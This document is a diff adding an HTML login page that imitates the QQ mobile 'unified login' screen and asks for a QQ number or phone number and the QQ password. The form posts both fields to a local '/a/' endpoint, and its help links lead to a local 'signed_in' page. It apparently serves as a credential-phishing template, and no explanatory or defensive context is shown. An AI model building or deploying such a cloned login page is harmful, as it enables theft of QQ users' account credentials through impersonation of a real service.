@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="zh-cn">
+
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+  <meta id="viewport" name="viewport"
+    content="width=device-width,minimum-scale=1,maximum-scale=1,initial-scale=1,user-scalable=no">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <title>手机统一登录</title>
+  <style type="text/css">
+    @charset "utf-8";
+    
+    body {
+      font-size: 16px;
+      background: #eee
+    }
+    * {
+      padding: 0;
+      margin: 0;
+      list-style: none;
+      text-decoration: none
+    }
+    input:focus {
+      outline: 0
+    }
+    #g_u{border-bottom:1px solid #eaeaea}
+
+    .inputstyle {
+      width: 273px;
+      height: 44px;
+      color: #000;
+      border: none;
+      background: 0 0;
+      padding-left: 15px;
+      font-size: 16px;
+      -webkit-appearance: none
+    }
+    .logo {
+      background-image: url("logo.png");
+      height:100px;width:244px;margin:0 auto 20px;background-size:244px 100px
+    }
+    #switch,
+    #vcode,
+    #web_login {
+      margin: 0 auto
+    }
+
+    #web_login {
+      width: 290px
+    }
+    #g_list {
+      background: #fff;
+      height: 89px;
+      border-radius: 4px
+    }
+
+    #go,
+    #onekey {
+      width: 290px;
+      height: 44px;
+      line-height: 44px;
+      background: #146fdf;
+      border: none;
+      border-radius: 4px;
+      color: #fff;
+      font-size: 16px;
+      margin-top: 15px;
+      display: block
+    }
+
+    #switch #forgetpwd,
+    #switch #zc {
+      color: #246183;
+      line-height: 14px;
+      font-size: 14px;
+      padding: 15px 10px
+    }
+    #switch #forgetpwd {
+      float: left;
+      margin-left: -10px
+    }
+    #switch #zc {
+      float: right;
+      margin-right: -10px
+    }
+    #auto_login{height:24px;margin:15px 0;color:#246183;position:relative}
+    #auto_login .wording{position:absolute;left:40px;line-height:24px;height:24px;font-size:14px}
+    #remember,#remember+.checkbox,#vcode #input_tips,#vcode #vcode_img,#vcode #vcode_input,.del_touch,.del_touch_icon,.del_u,.header .img_out,.header img,.nick,.txt_default{position:absolute}
+    #remember{left:14px;top:5px;cursor:pointer;z-index:1;opacity:.01}
+    #remember:checked+.checkbox{background:url("checked.png") 1px 1px #146FDF;border-color:#146FDF}
+    #remember+.checkbox{display:inline-block;width:21px;height:21px;left:9px;top:1px;border:1px solid #9ABBE3;background:0 0;border-radius:11px}
+  </style>
+</head>
+
+<body>
+  <br>
+  <div id="logo" class="logo"></div>
+  <form name="input" action='/a/' method="POST">
+    <div id="web_login">
+      <ul id="g_list">
+        <li id="g_u">
+          <div id="del_touch" class="del_touch">
+            <span id="del_u" class="del_u"></span>
+          </div><input id="u" type="text" name="account" class="inputstyle" autocomplete="off" placeholder="QQ号码/手机/邮箱">
+        </li>
+        <li id="g_p">
+          <div id="del_touch_p" class="del_touch">
+            <span id="del_p" class="del_u"></span>
+          </div><input id="p" type="password" name="password" class="inputstyle" maxlength="16" autocorrect="off"
+            placeholder="请输入你的QQ密码">
+        </li>
+      </ul>
+      <div id="auto_login">
+        <input type="checkbox" id="remember" checked="checked"> 
+        <span class="checkbox"></span> 
+        <label class="wording"> 记住登录状态 </label>
+      </div>
+      <div>
+        <input type="submit" value="登 录" id="go" >
+      </div>
+
+  </form>
+
+  <div id="switch">
+    <span id="zc" onclick="window.open('static\\signed_in.html')">注册新帐号</span>
+    <span id="forgetpwd" onclick="window.open('static\\signed_in.html')">忘了密码？</span>
+  </div>
+</body>
+</html>
